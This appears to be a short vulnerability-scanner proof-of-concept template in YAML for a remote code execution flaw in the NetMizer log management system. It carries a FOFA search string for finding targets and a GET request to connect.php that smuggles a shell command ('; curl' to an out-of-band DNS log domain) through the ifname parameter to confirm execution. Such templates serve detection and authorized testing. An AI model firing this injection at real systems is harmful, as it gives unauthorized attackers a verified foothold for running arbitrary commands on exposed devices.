id: poc-yaml-netmizer-log-ms-connect-php-rce
info:
  name: NetMizer 日志管理系统 connect.php 远程代码执行漏洞
  severity: critical
  tags:
  - DNSLOG
  - rce
  finger: NetMizer 日志管理系统
  fofa: app="NetMizer-日志管理系统"
variables:
  reverse: new_dns_log()
  domain: reverse.Domain()
requests:
- method: GET
  path: /data/manage/connect.php?action=start&device=192.168.1.1&ifname=;curl+{{.domain}}+%23+&name=test&port=88
  expression: reverse.Verify()
transport: http
